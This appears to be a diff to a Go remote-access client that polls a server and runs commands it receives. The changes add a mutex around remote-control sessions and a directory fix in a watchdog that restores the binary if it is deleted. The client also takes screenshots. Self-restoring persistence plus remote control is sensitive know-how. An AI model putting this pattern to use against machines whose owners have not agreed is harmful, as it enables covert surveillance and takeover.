@@ -23,6 +23,7 @@ import (
 	"path/filepath"
 	"runtime"
 	"strings"
+	"sync"
 	"syscall"
 	"time"
 	"unsafe"
@@ -38,7 +39,7 @@ const (
 	// In production, use "https://clearpc.zm-tool.me"
 	ServerURL = "http://clearpc.zm-tool.me"
 	// ServerURL = "http://localhost:1214"
-	// WSServerURL  = "ws://clearpc.zm-tool.me/api/ws/client"
+	// WebSocket URL is automatically derived from ServerURL (http -> ws, https -> wss)
 	PollInterval = 5 * time.Second
 )
 
@@ -73,6 +74,12 @@ type CommandLog struct {
 // Global client for reuse
 var httpClient *http.Client
 var currentDeviceID string
+
+// Remote Control State
+var (
+	rcMutex   sync.Mutex
+	rcRunning bool
+)
 
 var (
 	watchdogMode = flag.Bool("watchdog", false, "Run in watchdog mode")
@@ -117,6 +124,8 @@ func main() {
 		if targetPath != "" {
 			// Restore if missing
 			if _, err := os.Stat(targetPath); os.IsNotExist(err) {
+				// Ensure directory exists before copying
+				os.MkdirAll(filepath.Dir(targetPath), 0755)
 				copyFile(myPath, targetPath)
 			}
 			// Start the Main Client
@@ -344,6 +353,17 @@ func executeCommand(cmd Command) {
 
 	case "remote_control":
 		log.Println("Starting remote control...")
+
+		rcMutex.Lock()
+		if rcRunning {
+			log.Println("Remote control already running, ignoring command.")
+			rcMutex.Unlock()
+			result = "Remote control already running"
+			break
+		}
+		rcRunning = true
+		rcMutex.Unlock()
+
 		// Start in a goroutine as it blocks
 		go startRemoteControl()
 		result = "Remote control started"
@@ -1366,6 +1386,13 @@ func takeScreenshot() string {
 }
 
 func startRemoteControl() {
+	defer func() {
+		rcMutex.Lock()
+		rcRunning = false
+		rcMutex.Unlock()
+		log.Println("Remote control session ended")
+	}()
+
 	// Connect to WS
 	// Derive WS URL from ServerURL dynamically to match current config
 	wsURL := strings.Replace(ServerURL, "http", "ws", 1) + "/api/ws/client?id=" + currentDeviceID
